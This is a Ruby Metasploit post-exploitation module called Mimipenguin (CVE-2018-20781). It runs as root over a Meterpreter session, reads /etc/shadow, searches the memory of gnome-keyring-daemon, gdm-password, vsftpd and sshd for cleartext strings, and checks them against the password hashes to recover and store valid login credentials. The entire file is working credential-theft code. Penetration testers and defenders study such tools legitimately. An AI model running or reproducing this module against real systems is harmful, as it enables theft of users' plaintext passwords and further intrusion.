##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'unix_crypt'

class MetasploitModule < Msf::Post
  Rank = NormalRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Process

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Mimipenguin',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Shelby Pace', # metasploit module
          'huntergregal' # poc
        ],
        'Platform' => [ 'linux' ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes' => [ 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' => [
          [ 'URL', 'https://github.com/huntergregal/mimipenguin'],
          [ 'CVE', '2018-20781']
        ],
        'DisclosureDate' => '2019-11-29',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_process_attach
              stdapi_sys_process_memory_read
              stdapi_sys_process_memory_search
            ]
          }
        }
      )
    )
  end

  def check
    CheckCode::Appears
  end

  def get_user_names_and_hashes
    shadow_contents = read_file('/etc/shadow')
    fail_with(Failure::UnexpectedReply, 'Failed to read \'/etc/shadow\'') if shadow_contents.empty?

    users = []
    lines = shadow_contents.split
    lines.each do |line|
      line_arr = line.split(':')
      next if line_arr.empty?

      user_name = line_arr&.first
      hash = line_arr&.second
      next unless hash.start_with?('$')
      next if hash.nil? || user_name.nil?

      users << { 'username' => user_name, 'hash' => hash }
    end

    users
  end

  def configure_passwords(user_data = [])
    user_data.each do |info|
      hash = info['hash']
      case hash[0..2]
      when '$1$'
        info['type'] = 'md5'
      when '$2a', '$2y'
        info['type'] = 'blowfish'
      when '$5$'
        info['type'] = 'sha256'
      when '$6$'
        info['type'] = 'sha512'
      end

      salt = ''
      if info['type'] == 'blowfish'
        arr = hash.split('$')
        next if arr.length < 4

        cost = arr[2]
        salt = arr[3][0..21]
        info['cost'] = cost
      else
        salt = hash.split('$')[2]
      end
      next if salt.nil?

      info['salt'] = salt
    end

    user_data
  end

  def get_matches(target_info = {})
    if target_info.empty?
      vprint_status('Invalid target info supplied')
      return []
    end

    target_pid = pidof(target_info['name']).first
    if target_pid.nil?
      print_bad("PID for #{target_info['name']} not found.")
      return []
    end

    target_info['pid'] = target_pid
    vprint_status("Searching PID #{target_pid}...")
    mem_search_ascii(target_pid, 5, 500, target_info['needles'])
  end

  # Selects memory regions to read based on locations
  # of matches
  def choose_mem_regions(match_data = [])
    return [] if match_data.empty?

    mem_regions = []
    match_data.each do |match|
      next unless match.key?('sect_start') && match.key?('sect_len')

      start = match.fetch('sect_start')
      len = match.fetch('sect_len')
      mem_regions << { 'start' => start, 'length' => len }
    end

    mem_regions.uniq!
    pid = match_data.first['pid']
    mem_data = read_file("/proc/#{pid}/maps")
    return mem_regions if mem_data.nil?

    lines = mem_data.split("\n")
    updated_regions = mem_regions.clone
    mem_regions.each do |region|
      address = region['start']
      addr_line = lines.select { |line| line.start_with?(address.to_s(16)) }
      next if addr_line.empty?

      addr_line = addr_line.first

      index = lines.index(addr_line)
      next if index.nil?
      next if lines[index + 1].nil?

      # Password may be in next memory region if
      # match is found near end of previous region
      addr_line = lines[index + 1]
      addresses = addr_line.split&.first
      start_addr, end_addr = addresses.split('-')
      start_addr = start_addr.to_i(16)
      end_addr = end_addr.to_i(16)

      length = end_addr - start_addr
      updated_regions << { 'start' => start_addr, 'length' => length }
    end

    updated_regions
  end

  def get_printable_strings(pid, start_addr, section_len)
    lines = []
    curr_addr = start_addr
    max_addr = start_addr + section_len

    while curr_addr < max_addr
      data = mem_read(pid, curr_addr, 1000)
      if data.gsub("\x00", '').empty?
        curr_addr += 800
        next
      end

      lines << data.split("\x00")
      lines = lines.flatten
      curr_addr += 800
    end

    lines.each { |line| line.gsub!(/[^[:print:]]/, '') }
    lines.reject! { |line| line.length < 5 }
    lines
  end

  def check_for_valid_passwords(captured_strings, user_data, process_name)
    captured_strings.each do |str|
      user_data.each do |pass_info|
        salt = pass_info['salt']
        hash = pass_info['hash']
        pass_type = pass_info['type']
        u_name = pass_info['username']
        case pass_type
        when 'md5'
          hashed = UnixCrypt::MD5.build(str, salt)
        when 'blowfish'
          BCrypt::Engine.cost = pass_info['cost'] || 12
          hashed = BCrypt::Engine.hash_secret(str, hash[0..28])
        when 'sha256'
          hashed = UnixCrypt::SHA256.build(str, salt)
        when 'sha512'
          hashed = UnixCrypt::SHA512.build(str, salt)
        end

        next unless hashed == hash

        print_good("Found valid password '#{str}' for user '#{u_name}'!")
        pass_info['password'] = str
        pass_info['process'] = process_name
      end
    end
  end

  def run
    fail_with(Failure::BadConfig, 'Root privileges are required') unless is_root?
    user_data = get_user_names_and_hashes
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve user information') if user_data.empty?
    password_data = configure_passwords(user_data)

    target_proc_info = [
      {
        'name' => 'gnome-keyring-daemon',
        'needles' => [
          '^+libgck\\-1.so\\.0$',
          'libgcrypt\\.so\\..+$'
        ],
        'pid' => nil
      },
      {
        'name' => 'gdm-password',
        'needles' => [
          '^_pammodutil_getpwnam_root_1$',
          '^gkr_system_authtok$'
        ],
        'pid' => nil
      },
      {
        'name' => 'vsftpd',
        'needles' => [
          '^::.+\\:[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$'
        ],
        'pid' => nil
      },
      {
        'name' => 'sshd:',
        'needles' => [
          '^sudo.+'
        ],
        'pid' => nil
      }
    ]

    captured_strings = []
    target_proc_info.each do |info|
      print_status("Checking for matches in process #{info['name']}")
      match_set = get_matches(info)
      if match_set.empty?
        vprint_status("No matches found for process #{info['name']}")
        next
      end

      match_set.each { |match| match.store('pid', info['pid']) }
      search_regions = choose_mem_regions(match_set)
      next if search_regions.empty?

      search_regions.each { |reg| captured_strings << get_printable_strings(info['pid'], reg['start'], reg['length']) }

      captured_strings.flatten!
      captured_strings.uniq!
      check_for_valid_passwords(captured_strings, password_data, info['name'])
    end

    results = password_data.select { |res| res.key?('password') && !res['password'].nil? }
    fail_with(Failure::NotFound, 'Failed to find any passwords') if results.empty?

    print_good("Found #{results.length} valid credential(s)!")
    results.each do |res|
      store_valid_credential(
        user: res['username'],
        private: res['password'],
        private_type: :password
      )
    end
  end
end
